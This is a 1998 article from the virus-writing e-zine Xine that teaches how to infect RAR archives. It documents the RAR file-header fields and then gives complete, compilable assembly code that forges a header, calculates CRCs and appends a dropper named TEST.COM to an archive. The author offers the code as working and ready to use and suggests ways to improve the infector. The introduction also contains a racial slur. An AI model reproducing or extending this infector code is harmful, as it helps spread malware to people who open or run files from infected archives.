   ;
   ;                                         /-----------------------------\
   ;                                         | Xine - issue #3 - Phile 110 |
   ;                                         \-----------------------------/
   ;
   ;
   ;
   ;                          Dropping over RAR archives
   ;                       From the Archives infector series
   ;                 by UnknowN Mnemonik(alias StarZer0 on irc)/iKx
   ;
   ;   Intro
   ;  +-----+
   ;
   ;  rar is very common in  the  warez  world , aproximately 75% of warez are
   ;  archived  with rar , rar are quite easy infect , they don't need complex
   ;  manipulation  and can  be  easily infected with 100 bytes of code , good
   ;  news no ? Ok let's infect them
   ;
   ;
   ;   The rar files structure
   ;  +-----------------------+
   ;
   ;  The header is small and it is the only one thing that need to be changed,
   ;  lets see how it's built , like in arj he have a header CRC , but no probs
   ;  virus coder destroy all protections once more .
   ;
   ;  There's no header signature ( bizarre mmm ? )
   ;
   ;
   ; Name                    Type                  Value
   ;
   ; OFFSET LABEL       TYP  VALUE        DESCRIPTION
   ; ------ ----------- ---- ----------- ----------------------------------
   ;
   ; 00     HEAD_CRC    DW   0000         Low part of the CRC header
   ; 02     HEAD_TYPE   DB   00           Block type
   ;
   ;         Value: 72h = Marker block       73h = Archive header
   ;                74h = File header        75h = Comment header
   ;                76h = extra information  77h = subblock
   ;                78h = recovery record
   ;
   ; 03     HEAD_FLAGS  DW   0000         Block size
   ;
   ;         Value: 4000h = old archive type , Ignored by older version
   ;                8000h = if set, ADD_SIZE field is present
   ;
   ; 05     (ADDSIZE)   DW   0000         Optional - added block if file block
   ;
   ; 07     RARCOMPSS   HEX  00000000     Compressed size
   ; 0B     RARUNCMPS   HEX  00000000     Uncompressed size
   ; 0F     HOSTOS      DB   00           Host operating system
   ;
   ;         Value:   0 = MS DOS             2 - WIN32
   ;                  1 = OS/2               3 - UNIX
   ;
   ; 10     CRC32       HEX  00000000     CRC32 of the original file
   ; 14     FILETIME    DW   0000         File time , msdos format
   ; 16     FILEDATE    DW   0000         File date , msdos format
   ; 18     VERNEED     DB   0            Version need to extract
   ; 19     METHODCMP   DB   0            Compression method
   ;
   ;         Value:  0x30 - storing                  0x33 - normal compression
   ;                 0x31 - fastest compression      0x34 - good compression
   ;                 0x32 - fast compression         0x35 - best compression
   ;
   ; 1A     NAMELENGTH  DB   0            File name length
   ; 1B     ATTRIB      DW   0            Rar attribute
   ; 1D     FILENAME    DS   ?            Filename
   ;
   ;   Infection
   ;  +----------+
   ;
   ;  I use the worst method for infection : THE DROPPER, it uses the stupidity
   ;  of some niggas under dos ( like a lot of poeple ) who see a .com and want
   ;  run it , this little com file is saying : Hey man ,  I'm here !!! run me,
   ;  run me, I have a suprise for you ( hehehe ) ,this method is also the best
   ;  to call niggas with their debugger  to disassemble it , anyway , it's the
   ;  more easy way of infection , waiting for progression
   ;
   ;      Algorithm
   ;    +-----------+
   ;
   ;  1ø Open the file
   ;  2ø Go to the end
   ;  3ø Calculate the Crc32 of the virus
   ;  4ø Calculate the Crc of the header
   ;  5ø Write the header
   ;  6ø Write the virus
   ;
   ;      Usefull code
   ;    +--------------+
   ;
   ;  To prove that it does WORK, I have included here some usefull code you can
   ;  use and analyse , anyway , rar infection is too easy , test this with  RAR
   ;  2.0 or upper and a TEST.RAR present  in the  same directory of the program,
   ;  compile the code with TASM/TLINK
   ;
   ; --------------------------------------------------------------------------

   .286
   .model tiny
   .code

   start:

   mov ax,3d02h                                    ; open the file
   mov dx,offset filename                          ; change name with you RAR
   int 21h                                         ; file

   xchg ax,bx                                      ; phucky handle bug

   mov ax,4202h                                    ; go to the end
   xor cx,cx
   xor dx,dx
   int 21h

   mov cx,fin-start
   mov si,offset start

   call crc_calc                                   ; get the CRC of this prog

   mov word ptr [RarCrc32],cx                      ; save it into RarCRC32
   mov word ptr [RarCrc32+2],dx

   mov cx,FinRarHeader-Rartype                     ; Get the Crc of the
   mov si,offset RarType                           ; header

   call crc_calc

   mov word ptr [RarHeaderCrc],cx                  ; save low word in
                                                   ; RarHeaderCrc

   mov ah,40h                                      ; write the header!
   mov cx,FinRarHeader-RarHeader
   mov dx,offset RarHeader
   int 21h

   mov word ptr [RarCrc32],0                       ; clean all the RARCRC32
   mov word ptr [RarCrc32+2],0
   mov word ptr [RarHeaderCrc],0

   mov ah,40h                                      ; write this code
   mov cx,Fin-start
   mov dx,offset Start
   int 21h

   mov ah,3eh                                      ; it's finish close the
   int 21h                                         ; file

   ret

   crc_calc:

   push bx
   push si cx

   call crc_table              ; render crc table

   pop cx si

   mov bp,cx

   mov cx,0ffffh
   mov dx,0ffffh

   xor ax,ax

   Crc_loop:

   lodsb
   mov bx,ax
   xor bl,cl
   mov cl,ch
   mov ch,dl
   mov dl,dh
   mov dh,bh
   shl bx,1
   shl bx,1
   xor cx,word ptr [bx+di]
   xor dx,word ptr [bx+di+02]
   dec bp

   jnz Crc_loop

   not dx
   not cx

   pop bx
   ret

   crc_table:

   mov    di,offset starttable+1024    ; the buffer table
                       ; remember : It begin by the end
   mov    bp,255               ; set bp equal 255
                       ; 255 * 4 = 1024
   std                 ; set Direction Flag On

   TableHighloop:              ; the major loop in the Crc table
                                           ; Calc

   mov cx,8                ; set the minus loop to 8
   mov dx,bp               ; dx = bp , major counter loop
   xor     ax,ax               ; ax = zero

   TableLowLoop:

   shr    ax,1             ; mov one byte of ax at right in
                                           ; bin
   rcr    dx,1             ; if anything losted , put it on
                                           ; dx

   jae    anomality            ; if superior or equal skip
                                           ; encrypt.

   xor    dx,08320h            ; encrypt value by a signature
   xor    ax,0EDB8h            ;

   anomality:

   loop   TableLowLoop         ; make it 8 times

   stosw                   ; write ax
   xchg   dx,ax
   stosw                   ; not write dx
   dec    bp               ; decrement the counter

   jnz TableHighLoop           ; repeat it until bp = 0

   mov word ptr [di],0         ; last value equal 0
   sub di,2
   mov word ptr [di],0
   cld                 ; clear direction flag

   ret

   filename:       db 'test.rar',0

   RarHeader:

   RarHeaderCrc:           db 34h, 0efh
   RarType:                db 074h
   RarFlags:               dw 8000h
   RarHeadsize:            dw FinRarHeader-RarHeader
   RarCompressed:          dd Fin-Start
   RarOriginal:            dd Fin-Start
   RarOs:                  db 0
   RarCrc32:               db 4 dup (0)
   RarFileTime:            db 063h, 078h                   ; random...
   RarFileDate:            db 031h, 024h
   RarNeedVer:             db 014h
   RarMethod:              db 030h
   RarFnameSize:           dw FinRarHeader-RarName
   RarAttrib:              dd 0

   RarName:                db 'TEST.COM'

   FinRarHeader:

   fin:

   starttable:     db 1024 dup (?)

   end start

   ; -----------------------------------------------------------------------------
   ;
   ;  Wanna build a good RAR infector ? Errrm as usual , a VXD is the best thing
   ;  to  do , otherwise ,  there are minor things to upgrade , RAR infection is
   ;  easy  as com  infector , try also  to use an existing header in a real RAR
   ;  file
   ;
   ;
   ;  Les petits D‚linquants (R)(C)(TM) [StarZero'98]
   ;
